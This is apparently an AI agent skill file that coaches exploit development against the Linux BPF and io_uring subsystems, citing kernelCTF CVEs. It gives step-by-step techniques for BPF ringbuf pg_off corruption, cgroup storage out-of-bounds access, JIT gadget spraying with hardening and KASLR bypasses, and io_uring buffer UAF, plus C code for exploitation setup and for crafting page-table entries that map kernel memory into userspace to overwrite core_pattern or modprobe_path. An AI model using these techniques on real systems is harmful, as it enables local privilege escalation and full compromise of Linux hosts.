---
name: kernel-bpf-io-uring
description: BPF and io_uring exploitation techniques including BPF ringbuf corruption, JIT spraying, io_uring buffer management UAF, and PTE manipulation. Use when developing exploits targeting BPF or io_uring subsystems.
---

# BPF and io_uring Exploitation

Expert guidance for exploiting the Linux BPF and io_uring subsystems. Covers 10+ kernelCTF CVEs.

## BPF Exploitation

### BPF Architecture for Exploitation
```
User space: bpf() syscall
    ├── BPF_PROG_LOAD  → Load eBPF program
    ├── BPF_MAP_CREATE → Create BPF map (array, hash, ringbuf, etc.)
    ├── BPF_MAP_UPDATE → Write to map
    ├── BPF_MAP_LOOKUP → Read from map
    └── BPF_PROG_ATTACH → Attach to hook point

Kernel:
    ├── Verifier (kernel/bpf/verifier.c) → Validates program safety
    ├── JIT Compiler (arch/x86/net/bpf_jit_comp.c) → Compiles to native
    ├── Maps (kernel/bpf/ringbuf.c, arraymap.c, etc.) → Data storage
    └── Helpers (bpf_ringbuf_reserve, bpf_tail_call, etc.)
```

### BPF Ringbuf Exploitation (CVE-2024-49861, CVE-2024-50164, CVE-2024-53125)

**Vulnerability**: pg_off field corruption in ringbuf reservation.

**Mechanism**:
1. BPF ringbuf uses producer/consumer model with shared memory
2. `bpf_ringbuf_reserve()` allocates chunks from ringbuf
3. `pg_off` field tracks current page offset for allocation
4. Corruption of pg_off causes writes to wrong memory location
5. `bpf_ringbuf_commit()` triggers wakeup writing to attacker-controlled address

**Exploitation Steps**:
```c
// 1. Create BPF ringbuf map
int ringbuf_fd = bpf_map_create(BPF_MAP_TYPE_RINGBUF, NULL, 0, 0, PAGE_SIZE * 4);

// 2. Load BPF program that reserves two chunks
// BPF bytecode:
//   r1 = bpf_ringbuf_reserve(&ringbuf, 0x3000, 0)  // chunk 1
//   r2 = bpf_ringbuf_reserve(&ringbuf, 0x3000, 0)  // chunk 2
//   // ... corrupt chunk 2's pg_off via vuln ...
//   bpf_ringbuf_commit(r2)  // writes to corrupted address

// 3. mmap the ringbuf to access consumer-visible data
void *ringbuf = mmap(NULL, PAGE_SIZE * 4, PROT_READ | PROT_WRITE,
                     MAP_SHARED, ringbuf_fd, 0);

// 4. Trigger BPF program execution
// 5. Read corrupted data from ringbuf or exploit the write
```

### BPF Cgroup Storage OOB (CVE-2025-38502)

**Vulnerability**: Tail call between programs with different cgroup map sizes.

**Mechanism**:
1. Program A has cgroup_storage map with small value_size
2. Program B has cgroup_storage map with large value_size
3. Tail call from A to B (or vice versa)
4. B accesses cgroup storage with A's smaller allocation
5. OOB read/write beyond allocated buffer

### eBPF JIT One-Gadget (CVE-2025-21700)

**Advanced technique for code execution without traditional ROP**:

1. **Principle**: BPF JIT compiler generates native x86 code from BPF bytecode. By carefully crafting BPF instructions, we can produce JIT output that contains useful gadget sequences.

2. **Constant Blinding Bypass**: When `bpf_jit_harden` is enabled, constants are XOR'd with random values. But jump offsets in JIT output are not blinded, allowing controlled code generation.

3. **Module KASLR Bypass**: BPF JIT uses a "pack allocator" that groups JIT code into pages. The allocation pattern reveals the base of the module region.

4. **Inter-Image Jumps**: Multiple BPF programs placed at page-aligned offsets. Jump between them to chain gadgets.

5. **FPU State Abuse**: FXSAVE instruction dumps 108 bytes of FPU state. By controlling FPU registers, write arbitrary 38 bytes to controlled location.

### BPF Helper Functions for Exploitation
```c
/* Common BPF syscall wrappers */
#include <linux/bpf.h>
#include <sys/syscall.h>

static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}

static inline int bpf_map_create(int type, const char *name,
                                  uint32_t key_size, uint32_t value_size,
                                  uint32_t max_entries) {
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    if (name) strncpy(attr.map_name, name, BPF_OBJ_NAME_LEN - 1);
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static inline int bpf_prog_load(int type, const struct bpf_insn *insns,
                                 uint32_t insn_cnt, const char *license) {
    char log_buf[4096] = {};
    union bpf_attr attr = {
        .prog_type = type,
        .insns = (uint64_t)insns,
        .insn_cnt = insn_cnt,
        .license = (uint64_t)license,
        .log_buf = (uint64_t)log_buf,
        .log_size = sizeof(log_buf),
        .log_level = 1,
    };
    int fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0) {
        fprintf(stderr, "BPF verifier: %s\n", log_buf);
    }
    return fd;
}
```

---

## io_uring Exploitation

### io_uring Architecture
```
User space:
    ├── io_uring_setup()    → Create io_uring instance
    ├── io_uring_enter()    → Submit/complete operations
    ├── io_uring_register() → Register buffers, files, etc.
    └── mmap()              → Map SQ/CQ rings

Kernel (fs/io_uring/):
    ├── io_ring_ctx         → Main context structure
    ├── io_submit_sqe()     → Process submission queue entries
    ├── io_buffer_list      → Provided buffer management
    └── io_rsrc_node        → Resource tracking
```

### io_uring Buffer Ring UAF (CVE-2023-6560, CVE-2025-21836, CVE-2025-40364)

**Pattern**: Buffer management structures freed but still accessible.

**CVE-2023-6560 Technique**:
1. Use `IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY` flags
2. Map CQ and SQ at controlled userspace addresses
3. SQ entry `user_data` field reinterpreted as PTE value when CQ overlaps
4. Write fake PTE to map kernel memory into userspace
5. Overwrite core_pattern via mapped kernel page

**Setup Code**:
```c
#include <linux/io_uring.h>
#include <sys/syscall.h>

static inline int io_uring_setup(unsigned entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}

static inline int io_uring_enter(int fd, unsigned to_submit,
                                  unsigned min_complete, unsigned flags) {
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, NULL, 0);
}

static inline int io_uring_register(int fd, unsigned opcode,
                                     void *arg, unsigned nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

/* Setup io_uring with NO_MMAP for exploitation */
int setup_io_uring_nommap(void) {
    struct io_uring_params params = {
        .flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY,
    };

    /* Pre-map SQ and CQ regions at fixed addresses */
    void *sq_region = mmap((void *)0x1000000, PAGE_SIZE,
                           PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    void *cq_region = mmap((void *)0x2000000, PAGE_SIZE,
                           PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    params.sq_off.user_addr = (unsigned long)sq_region;
    params.cq_off.user_addr = (unsigned long)cq_region;

    return io_uring_setup(1, &params);
}
```

### PTE Manipulation via io_uring/pipe

**Technique** (used in CVE-2023-6560, CVE-2025-37756):
1. Obtain page-level write primitive (io_uring or pipe_buffer)
2. Identify target PTE address (via leak or calculation)
3. Write crafted PTE value:
   ```
   PTE = (target_phys_addr >> 12 << 12) | _PAGE_PRESENT | _PAGE_RW | _PAGE_USER
   ```
4. Target PTE maps kernel page into userspace process
5. Read/write kernel memory through mapped page
6. Overwrite core_pattern or modprobe_path

```c
/* PTE value construction */
#define _PAGE_PRESENT  (1UL << 0)
#define _PAGE_RW       (1UL << 1)
#define _PAGE_USER     (1UL << 2)
#define _PAGE_ACCESSED (1UL << 5)
#define _PAGE_DIRTY    (1UL << 6)

unsigned long make_pte(unsigned long phys_addr) {
    return (phys_addr & ~0xFFFUL) |
           _PAGE_PRESENT | _PAGE_RW | _PAGE_USER |
           _PAGE_ACCESSED | _PAGE_DIRTY;
}
```

## Required Kernel Configuration

### BPF
```
CONFIG_BPF=y
CONFIG_BPF_SYSCALL=y
CONFIG_BPF_JIT=y
CONFIG_CGROUP_BPF=y          (for cgroup storage exploits)
CONFIG_BPF_EVENTS=y          (for perf-type programs)
```

### io_uring
```
CONFIG_IO_URING=y
```

## Capabilities Required

- **BPF**: Usually unprivileged BPF is allowed (kernel.unprivileged_bpf_disabled=0)
  - If restricted, need CAP_BPF or CAP_SYS_ADMIN
- **io_uring**: Usually unprivileged
  - Some operations need CAP_SYS_ADMIN

For code templates, see [templates/](templates/) directory.
